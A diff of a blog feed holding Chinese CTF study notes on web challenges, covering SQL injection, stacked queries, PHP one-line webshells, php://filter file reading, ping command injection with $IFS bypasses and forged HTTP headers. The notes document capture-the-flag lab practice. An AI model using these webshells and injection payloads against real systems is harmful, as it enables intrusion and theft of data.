@@ -8,13 +8,14 @@
     <author>
       <name>Tolalal</name>
     </author>
-    <updated>2022-09-21T14:52:24.722Z</updated>
+    <updated>2022-11-01T01:47:52.705Z</updated>
     <entry>
-        <id>http://example.com/2022/09/21/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/</id>
-        <title>CTF题目笔记</title>
-        <link rel="alternate" href="http://example.com/2022/09/21/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/"/>
+        <id>http://example.com/2022/11/01/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/</id>
+        <title>CTFNote</title>
+        <link rel="alternate" href="http://example.com/2022/11/01/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/"/>
         <content type="html">&lt;h1 id=&#34;ctf题目笔记&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ctf题目笔记&#34;&gt;#&lt;/a&gt; CTF 题目笔记&lt;/h1&gt;
-&lt;h2 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h2&gt;
+&lt;h2 id=&#34;一-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-注入&#34;&gt;#&lt;/a&gt; 一、注入&lt;/h2&gt;
+&lt;h3 id=&#34;1初识sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1初识sql注入&#34;&gt;#&lt;/a&gt; 1. 初识 SQL 注入&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;登录处使用 findadmin 方法&lt;/p&gt;
@@ -46,13 +47,13 @@
 &lt;p&gt;密码：123456&lt;/p&gt;
 &lt;p&gt;就真没想到这么 weak！！&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h3 id=&#34;get_post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#get_post&#34;&gt;#&lt;/a&gt; get_post&lt;/h3&gt;
+&lt;h3 id=&#34;2get_post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2get_post&#34;&gt;#&lt;/a&gt; 2.get_post&lt;/h3&gt;
 &lt;p&gt;可以通过 url 进行 get 操作，通过 hackbar 的 postpage 进行 post 操作&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/get_post.png&#34; alt=&#34;11&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;backup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#backup&#34;&gt;#&lt;/a&gt; backup&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;D:%5CPictures%5Cassets%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%5Cget_post.png&#34; alt=&#34;11&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;3backup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3backup&#34;&gt;#&lt;/a&gt; 3.backup&lt;/h3&gt;
 &lt;p&gt;注意源码泄露问题。&lt;/p&gt;
 &lt;p&gt;可用脚本 dirsearch 进行目录扫描。&lt;/p&gt;
-&lt;h3 id=&#34;warmup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#warmup&#34;&gt;#&lt;/a&gt; warmup&lt;/h3&gt;
+&lt;h3 id=&#34;4warmup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4warmup&#34;&gt;#&lt;/a&gt; 4.warmup&lt;/h3&gt;
 &lt;p&gt;代码审计&lt;/p&gt;
 &lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
     &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;emmm&lt;/span&gt;
@@ -103,7 +104,7 @@
     &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  
 &lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/warmup.png&#34; alt=&#34;aa&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;相关一句马&lt;/p&gt;
+&lt;h3 id=&#34;5相关一句马知识点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5相关一句马知识点&#34;&gt;#&lt;/a&gt; 5. 相关一句马 (知识点)&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;&amp;lt;?php eval($_REQUEST[&#39;key&#39;]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&amp;lt;?php system($_REQUEST[&#39;ab12&#39;]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&amp;lt;?php eval($_POST[123]);?&amp;gt;&lt;/strong&gt;&lt;/p&gt;
@@ -112,7 +113,7 @@
 &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/yijian.png&#34; alt=&#34;yijian&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/yijjian1.png&#34; alt=&#34;yijian1&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;php伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php伪协议&#34;&gt;#&lt;/a&gt; PHP 伪协议&lt;/h3&gt;
+&lt;h3 id=&#34;6php伪协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6php伪协议&#34;&gt;#&lt;/a&gt; 6.PHP 伪协议&lt;/h3&gt;
 &lt;p&gt;需要开启 allow_url_fopen 的: php://stdin、php://memory、php://temp&lt;/p&gt;
 &lt;p&gt;不需要开启 allow_wrl_fopen 的：php://filter&lt;/p&gt;
 &lt;p&gt;在 CTF 中常用的 php://filter&lt;/p&gt;
@@ -120,9 +121,9 @@
  php://input 需要 post 提交数据&lt;br /&gt;
  php://filter 可以提交？a=php://filter/read=convert.base64-encode/resource=xxx.php&lt;/p&gt;
 &lt;p&gt;url 中？代表传值的意思，id 代表变量，后面的 &amp;quot;=&amp;quot; 代表变量的值&lt;/p&gt;
-&lt;h3 id=&#34;suctf-2019easysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#suctf-2019easysql&#34;&gt;#&lt;/a&gt; [SUCTF 2019]EasySQL&lt;/h3&gt;
+&lt;h3 id=&#34;7suctf-2019easysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7suctf-2019easysql&#34;&gt;#&lt;/a&gt; 7.[SUCTF 2019]EasySQL&lt;/h3&gt;
 &lt;p&gt;一道 sql 注入的题目，题目原意是堆叠注入或该换 || 的用处。然而 wp 中却给出了一种短路处理的办法。&lt;/p&gt;
-&lt;p&gt;我们来细究一下它的原理。》》&lt;/p&gt;
+&lt;p&gt;我们来细究一下它的原理。&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h4 id=&#34;直接注&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#直接注&#34;&gt;#&lt;/a&gt; 直接注&lt;/h4&gt;
 &lt;p&gt;首先吗看题&lt;/p&gt;
@@ -137,7 +138,7 @@
 &lt;p&gt;越来越靠近真相了！！&lt;/p&gt;
 &lt;p&gt;所以它应该是对 &lt;code&gt;&#39;,&amp;quot;,&#39;),&amp;quot;)&lt;/code&gt;  报错了所以什么都不回显或者是过滤，再试试 database () 发现没有用？？&lt;/p&gt;
 &lt;p&gt;上面能回显整数却不回显字符 (a,b,c...)，em... 有问题。&lt;/p&gt;
-&lt;p&gt;回想上一张输入整数的图，他回显了个 &lt;code&gt;Array (    [0] =&amp;gt; 1 )&lt;/code&gt; ,en... 它从 xxx 这个表中返回了 1 条数据，说明这个数据表 xxx 中只有一条数据，si~~。&lt;/p&gt;
+&lt;p&gt;回想上一张输入整数的图，他回显了个 &lt;code&gt;Array ( [0] =&amp;gt; 1 )&lt;/code&gt; ,en... 它从 xxx 这个表中返回了 1 条数据，说明这个数据表 xxx 中只有一条数据，si~~。&lt;/p&gt;
 &lt;p&gt;继续，结合题目&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Give me your flag, I will tell you if the flag is right.&lt;/p&gt;
@@ -145,12 +146,12 @@
 &lt;p&gt;flag？is right？  很可能这条数据就是 flag！！！&lt;/p&gt;
 &lt;p&gt;说明这个源码查询的就是 flag！但查不出来为什么？再思考。&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt; select 1 from xxx&lt;/code&gt;  得到的结果就是，一堆 1，&lt;/p&gt;
+&lt;p&gt;&lt;code&gt; select 1 from xxx&lt;/code&gt;  得到的结果就是，一堆 1，1 的数量与数据数量有关。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;但是题目输入整数时它也得到 1.&lt;/p&gt;
+&lt;p&gt;又题目输入整数时它都得到 1，所以可能这里有个&lt;strong&gt;或结构&lt;/strong&gt;，&lt;/p&gt;
 &lt;p&gt;所以在 $_POST [&#39;query&#39;] 这块肯定有玄机，2 xxx =&amp;gt; 1??&lt;/p&gt;
-&lt;p&gt;难道是 || 语法？&lt;/p&gt;
-&lt;p&gt;再回想源码，（&lt;em&gt;&lt;strong&gt;&lt;s&gt;结合上面的分析，不妨把表记作 Flag，表中字段为 fffff，字段内容为我们要的 flag）&lt;/s&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;难道是 || 语法？试试 0. 0 的话查不出来.&lt;/p&gt;
+&lt;p&gt;再回想源码，（&lt;em&gt;&lt;strong&gt;结合上面的分析，不妨把表记作 Flag，表中字段为 fffff，字段内容为我们要的 flag）&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; $_POST&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;query&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Flag&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
 &lt;p&gt;所以应该是，&lt;/p&gt;
 &lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; $_POST&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;query&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;flag &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Flag&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
@@ -159,8 +160,7 @@
 &lt;p&gt;然后破案了。&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easysql_end.jpg&#34; alt=&#34;easysql_end&#34; /&gt;&lt;/p&gt;
 &lt;hr /&gt;
-&lt;h4 id=&#34;堆叠&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#堆叠&#34;&gt;#&lt;/a&gt; 堆叠&lt;/h4&gt;
-&lt;p&gt;本题也可用堆叠注入。&lt;/p&gt;
+&lt;h4 id=&#34;另一种姿势&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#另一种姿势&#34;&gt;#&lt;/a&gt; 另一种姿势&lt;/h4&gt;
 &lt;p&gt;先上 payload:&lt;/p&gt;
 &lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; sql_mode&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;pipes_as_concat&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
 &lt;p&gt;(前面一个 1 隔断前置 select 后面一个 1？)&lt;br /&gt;
@@ -172,7 +172,7 @@
 &lt;p&gt;上面那句执行是：&lt;/p&gt;
 &lt;p&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Flag&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
 &lt;p&gt;搞定。&lt;/p&gt;
-&lt;h3 id=&#34;easy_sql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#easy_sql&#34;&gt;#&lt;/a&gt; Easy_sql&lt;/h3&gt;
+&lt;h3 id=&#34;8easy_sql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8easy_sql&#34;&gt;#&lt;/a&gt; 8.Easy_sql&lt;/h3&gt;
 &lt;p&gt;有报错但发现 union select 被过滤了，&lt;/p&gt;
 &lt;p&gt;where 也被过滤了，但可以堆叠。&lt;/p&gt;
 &lt;p&gt;所以使用了 show tables 查表，show columns from ’table‘ 查字段&lt;/p&gt;
@@ -198,10 +198,167 @@
 &lt;/blockquote&gt;
 &lt;p&gt;相关资料： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0plc3NlWW91bmcvYXJ0aWNsZS9kZXRhaWxzLzQwNzg1MTM3P2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLUJsb2dDb21tZW5kRnJvbUJhaWR1LTEmYW1wO3V0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy1CbG9nQ29tbWVuZEZyb21CYWlkdS0x&#34;&gt;handler 语法&lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/easy_sql.jpg&#34; alt=&#34;easy_sql&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;9actf2020-新生赛exec&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#9actf2020-新生赛exec&#34;&gt;#&lt;/a&gt; 9.[ACTF2020 新生赛] Exec&lt;/h3&gt;
+&lt;p&gt;本题是一道 Linux 命令题。&lt;/p&gt;
+&lt;p&gt;注：ping 本身是一种命令行为。&lt;/p&gt;
+&lt;p&gt;通过分号断开。&lt;/p&gt;
+&lt;p&gt;payload 为&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;127.0.0.1;ls&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;试探是否能命令语句注入。&lt;/p&gt;
+&lt;p&gt;结果可以。&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;127.0.0.1;ls &amp;#x2F;;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;遍历目录下的文件。发现 flag 文件。&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;127.0.0.1;cat &amp;#x2F;flag;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;得到 flag。&lt;/p&gt;
+&lt;h3 id=&#34;10gxyctf2019ping-ping-ping&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#10gxyctf2019ping-ping-ping&#34;&gt;#&lt;/a&gt; 10.[GXYCTF2019]Ping Ping Ping&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;$IFS$1&lt;/code&gt; , &lt;code&gt; %09&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;为什么用内联执行&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token class-name type-declaration&#34;&gt;cat&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$IFS&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;token string backtick-quoted-string&#34;&gt;`ls`&lt;/span&gt; &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYyNDIyODQyL2FydGljbGUvZGV0YWlscy8xMjQ2MTYyMDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjY0MjU4MTY1MTY4MDAxODY1MTAwNTMlMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTY2NDI1ODE2NTE2ODAwMTg2NTEwMDUzJmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+dG9wX3Bvc2l0aXZlfmRlZmF1bHQtMS0xMjQ2MTYyMDYtbnVsbC1udWxsLjE0MiU1RXY1MCU1RWNvbnRyb2wsMjAxJTVFdjMlNUVjb250cm9sXzEmYW1wO3V0bV90ZXJtPSU1QkdYWUNURjIwMTklNURQaW5nJTIwUGluZyUyMFBpbmcmYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3&#34;&gt;Linux 绕过&lt;/span&gt;，&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYyNDIyODQyL2FydGljbGUvZGV0YWlscy8xMjQ2MTYyMDY=&#34;&gt;详解&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;11secret-file&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11secret-file&#34;&gt;#&lt;/a&gt; 11.Secret File&lt;/h3&gt;
+&lt;p&gt;找文件，抓包，看源码，找提示。&lt;/p&gt;
+&lt;p&gt;伪协议读取 flag.php&lt;/p&gt;
+&lt;h3 id=&#34;12lovesql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12lovesql&#34;&gt;#&lt;/a&gt; 12.LoveSQL&lt;/h3&gt;
+&lt;p&gt;试试，直接注，找到提示表，查询到 flag。&lt;/p&gt;
+&lt;h3 id=&#34;13http&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13http&#34;&gt;#&lt;/a&gt; 13.HTTP&lt;/h3&gt;
+&lt;p&gt;打开靶场，查看源码。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/aaahtp.jpg&#34; alt=&#34;http_1&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;进入 secret.php 发现如下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://evefortosaber.github.io/Open-pictures/ahttp_1.jpg&#34; alt=&#34;ahttp_1&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;此处是一个对报文来源的要求，用 burp 抓包，&lt;strong&gt;修改来源，发现没有 Referer，手动添加到 upgrade 上，或 cookie 上，内容 &lt;code&gt;Referer: https://Sycsecret.buuoj.cn&lt;/code&gt; &lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;再发送。得到 Response，要求用 &amp;quot;Syclover&amp;quot; 浏览器，&lt;strong&gt;在 User-Agent 中修改，Firefox 为 Syclover。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;再发送。得到 Response，&lt;strong&gt;&amp;quot;Read this locally!&amp;quot;&lt;/strong&gt;，在 upgrade 上加一行 ** &lt;code&gt;X-Forwarded-For: 127.0.0.1&lt;/code&gt; .**&lt;/p&gt;
+&lt;p&gt;再发送。就再 Responce 中得到 flag.&lt;/p&gt;
+&lt;p&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token request-line&#34;&gt;&lt;span class=&#34;token method property&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;token request-target url&#34;&gt;/Secret.php&lt;/span&gt; &lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;node3.buuoj.cn:29399&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;&#34;Syclover&#34; browser         #伪造客户端浏览器&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;gzip, deflate&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;close&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Referer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;https://www.Sycsecret.com     #伪造&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;X-Forwarded-for&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;127.0.0.1             #伪造源地址&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;1&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Cache-Control&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;max-age=0&lt;/span&gt;&lt;/span&gt;
+&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
+&lt;h3 id=&#34;14buyctfbabysql2019&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#14buyctfbabysql2019&#34;&gt;#&lt;/a&gt; 14.BUYCTF[BabySql2019]&lt;/h3&gt;
+&lt;p&gt;查询源代码，是 get 请求。&lt;/p&gt;
+&lt;p&gt;尝试登录，在输入 &lt;code&gt;1&#39;&lt;/code&gt;  时&lt;strong&gt;报错&lt;/strong&gt;，得知是&lt;strong&gt;单引号闭合&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;选择通过密码进行注入&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;输入  &lt;code&gt;1&#39; or 1=1 -- &#39;&lt;/code&gt;  报错，发现报错语句中没有 &lt;code&gt;or&lt;/code&gt; ，应该是&lt;strong&gt;过滤&lt;/strong&gt;了。&lt;/p&gt;
